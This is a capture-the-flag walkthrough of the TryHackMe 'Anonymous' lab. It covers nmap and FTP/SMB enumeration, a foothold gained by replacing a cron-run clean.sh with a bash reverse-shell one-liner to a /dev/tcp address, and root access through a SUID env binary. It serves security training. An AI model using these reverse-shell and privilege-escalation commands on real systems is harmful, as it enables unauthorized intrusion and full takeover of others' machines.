---
title: "TryHackMe - Anonymous"
author: Nasrallah
description: ""
date: 2022-04-15 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, smb, ftp]
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello l33ts, I hope you are doing well. We are doing [Anonymous](https://tryhackme.com/room/anonymous) from [TryHackMe](https://tryhackme.com)

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```Terminal
Nmap scan report for 10.10.50.126                                                                                                                            
Host is up (0.12s latency).                                                                                                                                  
Not shown: 996 closed tcp ports (reset)                                                                                                                      
PORT    STATE SERVICE     VERSION                                             
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst:
|   STAT:                                                                                                                                                    
| FTP server status:                                                          
|      Connected to ::ffff:10.11.31.131
|      Logged in as ftp                
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -21m37s, deviation: 0s, median: -21m37s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2022-04-03T12:43:56
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2022-04-03T12:43:56+00:00
```

There are 4 open ports:

 - 21 ftp vsftpd
 - 22 ssh OpenSSH 7.6p1
 - 139 netbios-ssn Samba smbd
 - 445 netbios-ssn Samba smbd

Let's start off by enumerating ftp since it allows anonymous login.

## FTP

We can connect to the ftp server with `ftp {target_IP}`, we supply the name as `anonymous` and we can left the password blank.

![](/assets/img/tryhackme/anonymous/a1.png)

We found some files on the server, we can download them to our machine using `get {filename}`.

Now that the files are downloaded, let's see what's on them.

![](/assets/img/tryhackme/anonymous/a3.png)

First, we have `clean.sh` script that seems to be a cleaning script. The `to_do.txt` file has a note for removing the anonymous login. The third file, `removed_file.log`, has a bunch of text that's beings repeated, and it is the same text we saw in the `clean.sh` script ,so there must be a cronjob that runs `clean.sh` regularly.

## SMB

We can check the shares of the smb server by running : `sudo smbclient -L {target_IP} -N`.

![](/assets/img/tryhackme/anonymous/a2.png)

We found `pics` share, we can connect to that share with this command : `sudo smbclient //{target_IP}/pics -N`

![](/assets/img/tryhackme/anonymous/asmb.png)

There are two pictures there, i downloaded them using `get {filename}`, inspected them for hidden content but i got nothing.


# **Foothold**

We can use the `clean.sh` script to get access to the machine, let's check it's permissions first.

![](/assets/img/tryhackme/anonymous/a4.png)

We see that can edit the script. What i did is i created a file with the same name 'clean.sh' and put the following script in that file.

```bash
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.11.x.x/9001 0>&1
```

This script sends a reverse shell, so i setup a listener on my machine with `nc -lvnp 9001`, and uploaded a script to the ftp server using `put clean.sh`.

![](/assets/img/tryhackme/anonymous/a5.png)

Waiting for some time, i got the shell.

![](/assets/img/tryhackme/anonymous/a6.png)


# **Privilege Escalation**

For privesc, I uploaded linpeas and ran it.

![](/assets/img/tryhackme/anonymous/a7.png)

We found that `env` has suid binary set, searching for the binary in [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid) we found that we can run `env /bin/bash -p` and get a root shell

![](/assets/img/tryhackme/anonymous/a8.png)

Great! We got root access.


---

Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) .
